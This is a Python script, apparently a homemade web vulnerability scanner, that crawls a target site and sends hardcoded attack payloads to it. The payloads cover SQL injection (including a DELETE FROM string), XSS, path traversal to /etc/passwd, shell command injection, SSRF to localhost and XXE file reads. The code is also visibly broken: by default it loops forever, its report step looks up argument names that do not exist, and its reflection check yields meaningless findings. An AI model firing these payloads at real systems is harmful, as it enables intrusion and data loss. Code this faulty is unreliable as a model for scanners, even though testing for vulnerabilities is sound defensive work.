import argparse
import os
import requests
from bs4 import BeautifulSoup
from datetime import datetime, timedelta
print ('''
      ____                       _ _           __  __             _ _
     / ___|  ___  ___ _   _ _ __(_) |_ _   _  |  \/  | ___  _ __ (_) |_ ___  _ __
     \___ \ / _ \/ __| | | | '__| | __| | | | | |\/| |/ _ \| '_ \| | __/ _ \| '__|
      ___) |  __/ (__| |_| | |  | | |_| |_| | | |  | | (_) | | | | | || (_) | |
     |____/ \___|\___|\__,_|_|  |_|\__|\__, | |_|  |_|\___/|_| |_|_|\__\___/|_|
                                       |___/''')
vulnerabilities = {
    'SQL Injection': ["'", "';", "';--", "';#", "')", "')--", "')#", "')/*", "' OR 1=1--", "' OR 1=1#", "';DELETE FROM", "';SELECT", "' AND 1=1--", "' AND 1=1#"],
    'Cross-Site Scripting (XSS)': ['<script>', '<img src="javascript:', '<iframe src="javascript:', '<a href="javascript:', 'javascript:'],
    'Local File Inclusion (LFI)': ['../../../../../../../../../etc/passwd', '../../../../../../../../../boot.ini', '../../../../../../../../../windows/win.ini'],
    'Remote Code Execution (RCE)': ['| ls', '| id', '| whoami', '| cat /etc/passwd', '| uname -a', '; ls', '; id', '; whoami', '; cat /etc/passwd', '; uname -a'],
    'Server-Side Request Forgery (SSRF)': ['http://localhost', 'http://127.0.0.1', 'http://0.0.0.0', 'http://[::1]', 'http://[::]'],
    'XML External Entity (XXE)': ['<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>', '<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://localhost"> ]>']
}

def parse_args():
    parser = argparse.ArgumentParser(description='A tool for detecting web vulnerabilities.')
    parser.add_argument('url', type=str, help='The URL of the target website.')
    parser.add_argument('--sql', action='store_true', help='Enable SQL Injection detection.')
    parser.add_argument('--xss', action='store_true', help='Enable Cross-Site Scripting (XSS) detection.')
    parser.add_argument('--lfi', action='store_true', help='Enable Local File Inclusion (LFI) detection.')
    parser.add_argument('--rce', action='store_true', help='Enable Remote Code Execution (RCE) detection.')
    parser.add_argument('--ssrf', action='store_true', help='Enable Server-Side Request Forgery (SSRF) detection.')
    parser.add_argument('--xxe', action='store_true', help='Enable XML External Entity (XXE) detection.')
    parser.add_argument('--depth', type=int, default=3, help='Maximum depth of the crawler.')
    parser.add_argument('--timeout', type=int, default=10, help='Timeout for requests.')
    parser.add_argument('--report', type=str, default='result.txt', help='Output file for the results.')
    parser.add_argument('--stop-after', type=int, default=0, help='Stop after a certain number of minutes.')
    return parser.parse_args()

def search_vulnerabilities(url, vuln_list):
    for vuln in vuln_list:
        url_with_payload = url + vuln
        try:
            response = requests.get(url_with_payload, timeout=args.timeout)
            if response.status_code != 200:
                continue

            soup = BeautifulSoup(response.text, 'html.parser')
            if soup.find_all(text=vuln):
                return url_with_payload
        except:
            continue
    return None

def crawl(url, depth):
    if depth <= 0:
        return
    try:
        response = requests.get(url, timeout=args.timeout)
        if response.status_code != 200:
            return

        soup = BeautifulSoup(response.text, 'html.parser')
        for link in soup.find_all('a'):
            href = link.get('href')
            if href.startswith('http'):
                if not any(domain in href for domain in args.url.split('/')[2:]):
                    continue
                if search_vulnerabilities(href, vulnerabilities.get('SQL Injection', [])) and args.sql:
                    print(f'[+] SQL Injection vulnerability found: {href}')
                if search_vulnerabilities(href, vulnerabilities.get('Cross-Site Scripting (XSS)', [])) and args.xss:
                    print(f'[+] Cross-Site Scripting (XSS) vulnerability found: {href}')
                if search_vulnerabilities(href, vulnerabilities.get('Local File Inclusion (LFI)', [])) and args.lfi:
                    print(f'[+] Local File Inclusion (LFI) vulnerability found: {href}')
                if search_vulnerabilities(href, vulnerabilities.get('Remote Code Execution (RCE)', [])) and args.rce:
                    print(f'[+] Remote Code Execution (RCE) vulnerability found: {href}')
                if search_vulnerabilities(href, vulnerabilities.get('Server-Side Request Forgery (SSRF)', [])) and args.ssrf:
                    print(f'[+] Server-Side Request Forgery (SSRF) vulnerability found: {href}')
                if search_vulnerabilities(href, vulnerabilities.get('XML External Entity (XXE)', [])) and args.xxe:
                    print(f'[+] XML External Entity (XXE) vulnerability found: {href}')
                crawl(href, depth-1)
    except:
        return

if __name__ == '__main__':
    args = parse_args()

    print('Website is up and running... Searching for vulnerabilities...')
    start_time = datetime.now()
    while True:
        crawl(args.url, args.depth)
        elapsed_time = datetime.now() - start_time
        if args.stop_after and elapsed_time.total_seconds() > args.stop_after * 60:
            break
    print('Scan finished.')

    with open(args.report, 'w') as f:
        f.write(f'Scan results for {args.url}\n')
        f.write('-' * 50 + '\n')
        for vuln_name, vuln_list in vulnerabilities.items():
            if not getattr(args, vuln_name.lower().replace(' ', '_')):
                continue
            f.write(f'{vuln_name} vulnerabilities:\n')
            for vuln in vuln_list:
                url_with_payload = args.url + vuln
                if search_vulnerabilities(args.url, vuln_list):
                    f.write(f'[+] {url_with_payload}\n')
            f.write('-' * 50 + '\n')
        f.write(f'Total elapsed time: {elapsed_time}\n')

    print(f'Results saved to {os.path.abspath(args.report)}')
